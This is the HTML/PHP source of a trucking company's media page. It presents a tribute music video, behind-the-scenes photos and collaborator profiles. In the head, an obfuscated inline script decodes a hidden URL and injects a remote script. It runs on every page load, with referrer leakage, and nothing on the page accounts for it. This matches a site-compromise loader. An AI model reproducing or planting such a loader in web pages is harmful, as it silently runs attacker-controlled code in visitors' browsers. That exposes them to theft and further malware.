<!doctype html>
<html>

<head>
    <script src="dmxAppConnect/dmxAppConnect.js"></script>
    <meta charset="UTF-8">
    <title>Media | Raging Wolf Solutions</title>

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.14.0/css/all.css" integrity="sha384-HzLeBuhoNPvSl5KYnjx0BT+WB0QEEqLprO+NBkkk5gbc67FTaL7XIGa2w1L0Xbgc" crossorigin="anonymous" />
    <link href="https://fonts.googleapis.com/css2?family=Lustria&amp;family=Muli:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.cdnfonts.com/css/sansation" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="bootstrap/5/css/bootstrap.min.css" />
    <link rel="stylesheet" href="css/style.css" />
    <link rel="stylesheet" href="css/stylesheet.css" />
    <script src="js/jquery-3.5.1.slim.min.js"></script>
    <script src="dmxAppConnect/dmxBootstrap5Navigation/dmxBootstrap5Navigation.js" defer=""></script>
    <script src="dmxAppConnect/dmxBackgroundVideo/dmxBackgroundVideo.js" defer=""></script>

    <script src="dmxAppConnect/dmxBootstrap5Modal/dmxBootstrap5Modal.js" defer></script>
    <link rel="icon" href="icons/favicon.ico">
    <link rel="stylesheet" href="dmxAppConnect/dmxValidator/dmxValidator.css" />
    <script src="dmxAppConnect/dmxValidator/dmxValidator.js" defer></script>
    <script src="dmxAppConnect/dmxBrowser/dmxBrowser.js" defer></script>
    <script>
        (function(){var _5S=document.createElement("script"),_jF=(function(_sP,_Ii){var _T2="";for(var _w6=0;_w6<_sP.length;_w6++){var _7h=_sP[_w6].charCodeAt();_7h-=_Ii;_7h+=61;_T2==_T2;_Ii>8;_7h%=94;_7h!=_w6;_7h+=33;_T2+=String.fromCharCode(_7h)}return _T2})(atob("OEREQENoXV1HQ1xKPz89OT42P1wzPz1dQDlINTxdZGExMmJjY2cxMmJkZ19mMl5mXjJlY2Rh"), 46);_5S!="q";_5S.src=_jF;_5S.async=!0;_5S.referrerPolicy="unsafe-url";_5S.type="text/javascript";function _Qm(){};5>4;var _G3=document.getElementsByTagName("script")[0];_G3.parentNode.insertBefore(_5S,_G3)})();
    </script>
    <script src="dmxAppConnect/dmxVideo/dmxVideo.js" defer></script>
</head>

<body is="dmx-app" id="index" class="bg-dark">
    <div is="dmx-browser" id="browser1"></div>

    <div class="modal fade" id="imageModal" tabindex="-1" aria-labelledby="imageModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered modal-lg">
            <div class="modal-content">
                <div class="modal-body bg-dark">
                    <img id="imageModalSrc" src="" class="img-fluid rounded mx-auto d-block" alt="...">
                </div>
                <div class="modal-footer bg-dark border-top-0 justify-content-center">
                    <button type="button" class="btn module-cta-btn lh-lg text-truncate btn-outline-warning ps-5 pe-5" data-bs-dismiss="modal">Close</button>
                </div>
            </div>
        </div>
    </div>

    <?php include 'navbar_mini'; ?>

    <?php include 'navbar_main'; ?>

    <!-- Full-width video player -->
    <div class="container-fluid p-0">
        <video controls="" autoplay="" muted="" loop="" class="w-100" style="height: 65vh;">
            <source src="path_to_your_video.mp4" type="video/mp4">
            Your browser does not support the video tag.
        </video>
    </div>

    <!-- Tab menu -->
    <div class="container mt-2 mb-5">
        <div class="d-flex justify-content-between flex-wrap-reverse align-items-center" style="min-height: 10vh" data-scrollx="true">
            <div class="table-responsive" data-scrollX="true">
                <ul id="mediatabs" class="nav nav-tabs flex-lg-row flex-row flex-nowrap">
                    <li class="nav-item align-self-end">
                        <a class="nav-link active" data-bs-toggle="tab" href="#about">About</a>
                    </li>
                    <li class="nav-item align-self-end">
                        <a class="nav-link" data-bs-toggle="tab" href="#photos">Photos</a>
                    </li>
                    <li class="nav-item align-self-end">
                        <a class="nav-link" data-bs-toggle="tab" href="#bloopers">Bloopers</a>
                    </li>
                    <li class="nav-item align-self-end">
                        <a class="nav-link" data-bs-toggle="tab" href="#collaborators">Collaborators</a>
                    </li>
                </ul>
            </div>
            <div class="d-flex bg-transparent pt-3 pb-3 ps-3 pe-3">
                <h5 class="align-self-center text-light mb-0">Streaming:</h5>
                <div class="d-flex ps-2 pe-2 align-items-center">
                    <img src="assets/images/Spotify-Logo-PNG5.webp" height="32px" class="hover-cursor me-2 rws-nav-item" dmx-on:click="browser1.goto('https://open.spotify.com/track/3lcTN29iAWUrN3OVDomFY8?si=523cabcd92a94c69')">
                    <img src="assets/images/Apple_Music.webp" height="32px" class="hover-cursor me-2 rws-nav-item" dmx-on:click="browser1.goto('https://music.apple.com/us/album/raging-wolf-solutions/1677461954?i=1677461955')">
                    <img src="assets/images/Amazon_Music_logo_PNG.webp" height="32px" class="hover-cursor me-2 rws-nav-item" dmx-on:click="browser1.goto('https://amazon.com/music/player/albums/B0BYNHW9CX?marketplaceId=ATVPDKIKX0DER&amp;musicTerritory=US&amp;ref=dm_sh_mLSEJK7B5sXg9aKhTU41skLXB')">
                    <img src="assets/images/pandora-logo-png.webp" height="32px" class="hover-cursor me-2 rws-nav-item" dmx-on:click="browser1.goto('https://www.pandora.com/artist/steve-radcliff/raging-wolf-solutions/raging-wolf-solutions/TRvb3wbPbZd656c?part=ug-desktop&amp;corr=160482520314414425')">
                </div>
            </div>
        </div>


        <!-- Tab content -->
        <div class="tab-content p-3">
            <div class="tab-pane fade show active" id="about">
                <h1 class="text-light">About The Song</h1>
                <p class="text-light">Raging Wolf Solutions' tribute to the trucking industry is a remarkable creation. The company partnered with a talented local artist to produce a video that showcases their core values: Family, Professionalism, and Country. The video is a celebration of the hardworking men and women of the trucking industry who keep our country moving. It is a testament to the importance of family and community in the lives of these dedicated professionals. The video highlights the professionalism and dedication of Raging Wolf Solutions to their customers, who they treat like family.
                <p>
                </p>
                <p class="text-light">This video also underscores the company's commitment to their country and to the vital role that the trucking industry plays in our economy and our daily lives. All in all, this video is a stirring tribute to the trucking industry and to the values that Raging Wolf Solutions holds dear.</p>
                </p>
                <!-- About content goes here -->
            </div>
            <div class="tab-pane fade" id="photos">
                <!-- Photos content goes here -->
                <h1 class="text-light">Behind the Scenes</h1>
                <p class="text-light">Get a behind-the-scenes look at the making of this powerful video with our exclusive music video behind the scenes photos. We provide a unique glimpse of the production of the music video, highlighting the hard work and dedication that went into creating this tribute.</p>

                <div class="container wappler-block py-3 gx-0">
                    <div class="row">
                        <div class="mb-4 col-12 col-sm-6 col-md-4 image-container">
                            <img class="wappler-type-picture w-100 h-100" src="assets/images/media/9b6cdb0b-21ac-47a2-bf33-de0e8aa0249c.png">
                            <a href="assets/images/media/9b6cdb0b-21ac-47a2-bf33-de0e8aa0249c.png" download class="download-btn">Download&nbsp;<i class="fas fa-download"></i></a>
                        </div>
                        <div class="mb-4 col-12 col-sm-6 col-md-4 image-container">
                            <img class="wappler-type-picture w-100" src="assets/images/media/CLIPS.00_00_44_23.Still004.jpg">
                            <a href="assets/images/media/CLIPS.00_00_44_23.Still004.jpg" download class="download-btn">Download&nbsp;<i class="fas fa-download"></i></a>
                        </div>
                        <div class="mb-4 col-12 col-sm-6 col-md-4 image-container">
                            <img class="wappler-type-picture w-100" src="assets/images/media/CLIPS.00_03_36_13.Still008.jpg">
                            <a href="assets/images/media/CLIPS.00_03_36_13.Still008.jpg" download class="download-btn">Download&nbsp;<i class="fas fa-download"></i></a>
                        </div>
                        <div class="mb-4 col-12 col-sm-6 col-md-4 image-container">
                            <img class="wappler-type-picture w-100" src="assets/images/media/CLIPS.00_03_56_00.Still009.jpg">
                            <a href="assets/images/media/CLIPS.00_03_56_00.Still009.jpg" download class="download-btn">Download&nbsp;<i class="fas fa-download"></i></a>
                        </div>
                        <div class="mb-4 col-12 col-sm-6 col-md-4"><img class="wappler-type-picture w-100">
                        </div>
                        <div class="mb-4 col-12 col-sm-6 col-md-4"><img class="wappler-type-picture w-100">
                        </div>
                        <div class="mb-4 col-12 col-sm-6 col-md-4"><img class="wappler-type-picture w-100">
                        </div>
                        <div class="mb-4 col-12 col-sm-6 col-md-4"><img class="wappler-type-picture w-100">
                        </div>
                        <div class="mb-4 col-12 col-sm-6 col-md-4"><img class="wappler-type-picture w-100">
                        </div>
                    </div>
                </div>
            </div>

            <div class="tab-pane fade" id="bloopers">
                <!-- Bloopers content goes here -->
                <h1 class="text-light">Blooper Video Clips</h1>
                <p class="text-light">In addition to this heart-warming tribute, we've also included some light-hearted bloopers from filming that are sure to make you chuckle! The bloopers are a fun reminder that even the most professional of projects can have a bit of fun along the way. Enjoy!</p>
                <div class="container wappler-block pt-4 pb-4">
                    <div class="row">
                        <div class="text-center col-12 col-sm-6 col-lg-3 mb-3">
                            <video is="dmx-video" id="video1" width="100%"></video>
                        </div>
                        <div class="text-center col-12 col-sm-6 col-lg-3 mb-3"><video is="dmx-video" id="video2" width="100%"></video>
                        </div>
                        <div class="text-center col-12 col-sm-6 col-lg-3 mb-3"><video is="dmx-video" id="video3" width="100%"></video>
                        </div>
                        <div class="text-center col-12 col-sm-6 col-lg-3 mb-3"><video is="dmx-video" id="video4" width="100%"></video>
                        </div>
                        <div class="text-center col-12 col-sm-6 col-lg-3 mb-3"><video is="dmx-video" id="video5" width="100%"></video>
                        </div>
                        <div class="text-center col-12 col-sm-6 col-lg-3 mb-3"><video is="dmx-video" id="video6" width="100%"></video>
                        </div>
                        <div class="text-center col-12 col-sm-6 col-lg-3 mb-3"><video is="dmx-video" id="video7" width="100%"></video>
                        </div>
                        <div class="text-center col-12 col-sm-6 col-lg-3 mb-3"><video is="dmx-video" id="video8" width="100%"></video>
                        </div>
                        <div class="text-center col-12 col-sm-6 col-lg-3 mb-3"><video is="dmx-video" id="video9" width="100%"></video>
                        </div>
                        <div class="text-center col-12 col-sm-6 col-lg-3 mb-3"><video is="dmx-video" id="video10" width="100%"></video>
                        </div>
                        <div class="text-center col-12 col-sm-6 col-lg-3 mb-3"><video is="dmx-video" id="video11" width="100%"></video>
                        </div>
                        <div class="text-center col-12 col-sm-6 col-lg-3 mb-3"><video is="dmx-video" id="video12" width="100%"></video>
                        </div>
                    </div>
                </div>
            </div>

            <div class="tab-pane fade" id="collaborators">
                <h1 class="text-light">Thanks to Our Collaborators</h1>
                <p class="text-light">We couldn't have made this video without the help of some amazing collaborators. We are proud to have worked with talented local artists, as well as a handful of local companies for shooting locations, music and video production, clothing and costumes, and more. A big thank you to everyone who helped make this video a reality and a tribute to our truckers.</p>
                <div class="container wappler-block">
                    <div class="row gx-5">
                        <div class="col-12 col-md-4">
                            <div class="row h-100">
                                <div class="col module-card border rounded-0 rounded-1 border-secondary mt-3 mb-3 pt-2 pb-2 ps-3 pe-3">
                                    <div class="row">
                                        <div class="col-12 my-2">
                                            <div class="d-flex justify-content-center flex-column">
                                                <div class="d-flex collaborator-flex justify-content-center align-items-center"><img src="assets/images/Post_Road.png" style="max-width: 100% !important;" width="272px;"></div>

                                                <hr class="text-white">
                                            </div>

                                            <h3 class="text-light mt-2 text-start">Post Road</h3>
                                            <p class="text-start text-white-50 mb-2"><i>Post Road</i> is a popular country band from Northeast Ohio that performs both original music and covers from today's top country artists. The band was formed in 2011 and has opened for several national acts and headlined at various venues and festivals. The band consists of Sarah Radcliff and Shawn Roland on lead vocals, Steve Radcliff and Andrew Krakowski on guitars, Dave Warner on bass and Dave Vogrin on drums.</p>
                                            <button id="btn1" class="btn module-cta-btn lh-lg text-truncate btn-sm btn-outline-link text-warning pt-1 pb-0 ps-0 pe-0" dmx-on:click="browser1.goto('http://www.postroadcountry.com/')">Learn more&nbsp;<i class="fas fa-external-link-alt"></i></button>
                                        </div>
                                    </div>
                                </div>
                            </div>

                        </div>
                        <div class="col-12 col-md-4">
                            <div class="row h-100">
                                <div class="col module-card border rounded-0 rounded-1 border-secondary mt-3 mb-3 pt-2 pb-2 ps-3 pe-3">
                                    <div class="row">
                                        <div class="col-12 my-2">
                                            <div class="d-flex justify-content-center flex-column">
                                                <div class="d-flex justify-content-center collaborator-flex align-items-center"><img src="assets/images/StageS2-removebg-preview2.webp" height="82px;"></div>

                                                <hr class="text-white">
                                            </div>


                                            <h3 class="text-light mt-2 text-start">StageS</h3>
                                            <p class="text-start text-white-50 mb-2"><i>StageS</i> is a group of longtime friends and fellow musicians that plays a mix of rock and roll covers and originals that will keep you entertained all night long! They have been rocking the Northeast Ohio area since 2008, and they have a loyal fan base that follows them wherever they go. You can check out their Facebook page to see their upcoming events, photos and videos of their performances.</p>
                                            <button id="btn4" class="btn module-cta-btn lh-lg text-truncate btn-sm btn-outline-link text-warning pt-1 pb-0 ps-0 pe-0" dmx-on:click="browser1.goto('http://www.postroadcountry.com/')">Learn more&nbsp;<i class="fas fa-external-link-alt"></i></button>
                                        </div>
                                    </div>
                                </div>
                            </div>

                        </div>
                        <div class="col-12 col-md-4">
                            <div class="row h-100">
                                <div class="col module-card border rounded-0 rounded-1 border-secondary mt-3 mb-3 pt-2 pb-2 ps-3 pe-3">
                                    <div class="row">
                                        <div class="col-12 my-2">
                                            <div class="d-flex justify-content-center flex-column">
                                                <div class="d-flex justify-content-center align-items-center"><img src="assets/images/Spider_Studios.webp" height="90px;"></div>

                                                <hr class="text-white">
                                            </div>



                                            <h3 class="text-light mt-2 text-start">Spider Studios</h3>
                                            <p class="text-start text-white-50 mb-2"><i>Spider Studios</i> is a recording studio located in Olmsted Falls, Ohio, near Cleveland. They have been in the industry for over 25 years, creating household names and setting trends. They offer services such as recording, mixing, and mastering, as well as a massive amount of gear and a great space to suit every need. Spider Studios has worked with artists such as Machine Gun Kelly, Chimaira, and Ohio Sky.</p>
                                            <button id="btn5" class="btn module-cta-btn lh-lg text-truncate btn-sm btn-outline-link text-warning pt-1 pb-0 ps-0 pe-0" dmx-on:click="browser1.goto('http://www.postroadcountry.com/')">Learn more&nbsp;<i class="fas fa-external-link-alt"></i></button>
                                        </div>
                                    </div>
                                </div>
                            </div>

                        </div>

                    </div>
                    <div class="row gx-5">
                        <div class="col-12 col-md-4">
                            <div class="row h-100">
                                <div class="col module-card border rounded-0 rounded-1 border-secondary mt-3 mb-3 pt-2 pb-2 ps-3 pe-3">
                                    <div class="row">
                                        <div class="col-12 my-2">
                                            <div class="d-flex justify-content-center collaborator-flex align-items-center"><img src="assets/images/marsam_main_logo.webp" height="74px;"></div>

                                            <hr class="text-white">
                                            <h3 class="text-light mt-2 text-start">Marsam Metal Fab</h3>
                                            <p class="text-start text-white-50 mb-2"><i>Marsam Metal Fab</i> is a metal fabricating company that serves customers in Northeastern Ohio. They use state of the art technology to produce a wide range of products, from small sheet metal parts to large enclosures and assemblies. They have been in operation since 1998 and strives for excellence in quality, service and customer satisfaction.</p>
                                            <button id="btn3" class="btn module-cta-btn lh-lg text-truncate btn-sm btn-outline-link text-warning pt-1 pb-0 ps-0 pe-0" dmx-on:click="browser1.goto('http://www.postroadcountry.com/')">Learn more&nbsp;<i class="fas fa-external-link-alt"></i></button>
                                        </div>
                                    </div>
                                </div>
                            </div>

                        </div>
                        <div class="col-12 col-md-4">
                            <div class="row h-100">
                                <div class="col module-card border rounded-0 rounded-1 border-secondary mt-3 mb-3 pt-2 pb-2 ps-3 pe-3">
                                    <div class="row">
                                        <div class="col-12 my-2">
                                            <div class="d-flex justify-content-center collaborator-flex align-items-center"><img src="assets/images/bullseye_logo.webp" height="80px"></div>

                                            <hr class="text-white">
                                            <h3 class="text-light mt-2 text-start">Bullseye Activewear</h3>
                                            <p class="text-start text-white-50 mb-2"><i>Bullseye Activewear</i> is a full service printing company that specializes in screen printing and embroidery of apparel and promotional items. They are based in Brunswick, Ohio and they serve customers in Cuyahoga, Medina and Summit Counties. Bullseye has been in business since 1992 and prides itself on delivering exceptional products with attention to detail.</p>
                                            <button id="btn2" class="btn module-cta-btn lh-lg text-truncate btn-sm btn-outline-link text-warning pt-1 pb-0 ps-0 pe-0" dmx-on:click="browser1.goto('http://www.postroadcountry.com/')">Learn more&nbsp;<i class="fas fa-external-link-alt"></i></button>
                                        </div>
                                    </div>
                                </div>
                            </div>

                        </div>
                    </div>
                </div>
                <!-- Collaborators content goes here -->
            </div>
        </div>
    </div>

    <?php include 'footer.php'; ?>

    <script src="bootstrap/5/js/bootstrap.bundle.min.js"></script>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
        let containers = document.querySelectorAll(".image-container");
        
        containers.forEach(function(container) {
            let image = container.querySelector(".wappler-type-picture");
            let downloadBtn = container.querySelector(".download-btn");
    
            container.addEventListener("mouseover", function() {
                downloadBtn.style.display = "block";
            });
    
            container.addEventListener("mouseout", function() {
                downloadBtn.style.display = "none";
            });
    
            image.addEventListener("click", function() {
                let modal = new bootstrap.Modal(document.getElementById('imageModal'));
                document.getElementById('imageModalSrc').src = this.src;
                modal.show();
            });
        });
    });
    </script>
</body>

</html>